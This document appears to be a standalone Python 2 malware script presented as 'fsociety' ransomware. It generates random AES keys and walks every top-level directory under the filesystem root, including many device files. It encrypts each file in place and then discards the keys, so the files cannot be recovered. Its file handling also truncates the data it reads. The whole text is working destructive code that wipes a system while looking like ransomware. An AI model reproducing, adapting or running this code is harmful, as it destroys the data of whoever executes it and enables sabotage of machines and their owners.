#!/usr/bin/python
# -*- coding: UTF-8 -*-

import os
import subprocess
import sys
import header
from Crypto.Cipher import AES
from Crypto import Random
from Crypto.Hash import SHA256
from random import SystemRandom

def encrypt(filepath, key):
    initialization_vector = Random.new().read(16)
    encryptor = AES.new(key, AES.MODE_CBC, initialization_vector)
    with open(filepath, 'rb') as infile:
        with open(filepath, 'wb') as outfile:
            while True:
                chunk = infile.read(65536)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - (len(chunk) % 16))
                outfile.write(encryptor.encrypt(chunk))

def load_entropy():
    print "Loading Source of Entropy"
    source = os.urandom(256)
    for i in range(3):
      source += os.urandom(2 ** (21 + i))
      update_progress(((i + 1.0) / 3.0))
    print "\n"
    return source

def update_progress(progress):
    bar_length = 23
    status = "({}%)".format(str(progress)[2:4])
    if progress >= 1.0:
        progress = 1
        status = "COMPLETE"
    block = int(round(bar_length * progress))
    text = "\r{0}\t\t{1}".format("#" * block + " " * (bar_length - block), status)
    sys.stdout.write(text)
    sys.stdout.flush()

def generate_keys(source):
    print "Generating Keys"
    keys = []
    for i in range(9):
        keys.append(SHA256.new(''.join(SystemRandom().choice(source) for x in range(SystemRandom().randint(128, 256)) for x in range(SystemRandom().randint(128, 256)))).digest())
        if i % 3 == 0:
            update_progress(((i + 1.0) / 3.0))
    print "\n"
    return keys

def locate_files():
    print "Locating target files."
    targets = next(os.walk('/'))[1]
    for core in ('proc', 'sys', 'lib', 'run'):
        targets.remove(core)
    return targets

def encrypt_dir(directory, key):
    root = next(os.walk(directory))[0]
    directories = next(os.walk(directory))[1]
    files = next(os.walk(directory))[2]

    if len(files) > 0:
        for file in files:
            path = root + '/' + file
            try:
                if '/dev' in path[:4]:
                    if not any(substring in path for substring in ('sg', 'fd', 'char', 'by-u', 'pts', 'cpu', 'mapper', 'input', 'bus', 'disk')):
                        if not any(substring in file for substring in ('dm-', 'sda', 'port', 'vcs', 'tty', 'initctl', 'stderr', 'stdin', 'stdout', 'sg', 'hidraw', 'psaux', 'ptmx', 'console', 'random', 'zero', 'mem', 'rfkill', 'card', 'control', 'pcm', 'seq', 'timer', '-', ':', 'disk', 'block', 'char')):
                            encrypt(path, key)
                else:
                    encrypt(path, key)
            except:
                pass

    if len(directories) > 0:
        for directory in directories:
            path = root + '/' + directory
            encrypt_dir(path, key)

def pwn():
    keys = generate_keys(load_entropy())
    dirs = locate_files()
    print "beginning crypto operations"
    for dir in sorted(dirs):
        directory = '/%s' % dir
        print "Encrypting {}".format(directory)
        encrypt_dir(directory, key=SystemRandom().choice(keys))
    keys = None
    del keys
    print "      __                _      _         \n     / _|              (_)    | |        \n    | |_ ___  ___   ___ _  ___| |_ _   _ \n    |  _/ __|/ _ \ / __| |/ _ \ __| | | |\n    | | \__ \ (_) | (__| |  __/ |_| |_| |\n    |_| |___/\___/ \___|_|\___|\__|\__, |\n                                    __/ |\n                                   |___/ \n\ncddddddddddddddddddddddddddddddddddddddddddd;\n0Mo..........':ldkO0KKXXKK0kxoc,..........kMd\n0Ml......;d0WMMMMMMMMMMMMMMMMMMMWKx:......kMd\n0Ml...cOWMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:...kMd\n0Ml.lNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNc.kMd\n0MdKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM0OMd\n0MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMd\n0MxcxWMMMMMNXXNMMMMMMMMMMMMMMMNXXNMMMMMWkcKMd\n0Md..lMKo,.,'...:kWMMMMMMMNx;...',.;dXMl.'XMd\n0Mx'.,O;dXMMMXl....:dWMNo;....oXMMMKd;0,.'KMd\n0MO;.,NMWMMMMMMWk;...XMK...:OWMMMMMMWMN,.cNMd\n0MxxNMX;KMMKdcclkWN0WMMMN0WNxc:lxXMMk;WMXdKMd\n0MMMMMO;MMl.......KMXOMNkMk.......xMM.NMMMMMd\n0MMMMMMXKoclddl;.oWMdkMN,MN:.:ldolcdXNMMMMMMd\n0MMMMMMWXMMMMMMMW0KdoNMMdox0MMMMMMMMXMMMMMMMd\n0MMMMXc'WMMMMMMMMkcWMMMMMMkcMMMMMMMMN'lXMMMMd\n0MMMd..cMMMMMMMMNdoKMMMMM0x:XMMMMMMMM:..kMMMd\n0MM0....d0KKOd:.....c0Kx'.....:d0NX0l....NMMd\n0MMO.....................................WMMd\n0Mdkc...................................0kOMd\n0Ml.:Ol;........';;.......;,........':oX:.kMd\n0Ml..,WMMMMWWWo...';;:c::;'...:WWMMMMMW;..kMd\n0Ml...dMMMMMMMMKl...........c0MMMMMMMMd...kMd\n0Ml...cMMMMMMMMMMMXOxdddk0NMMMMMMMMMMM'...kMd\n0Ml....KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMO....kMd\n0Ml.....OMMMMMMMMMMMMMMMMMMMMMMMMMMMK.....kMd\n0Ml......:XMMMMMMMMMMMMMMMMMMMMMMMNl......kMd\n0Ml........lXMMMMMMMMMMMMMMMMMMMKc........kMd\n0Ml..........:KMMMMMMMMMMMMMMM0,..........kMd\noO:............xOOOx:'';dOOOOd............lOc\n\n"
    exit(0)

if __name__ == '__main__':
    subprocess.call('clear')
    header.put()
    print "Executing ..."
    pwn()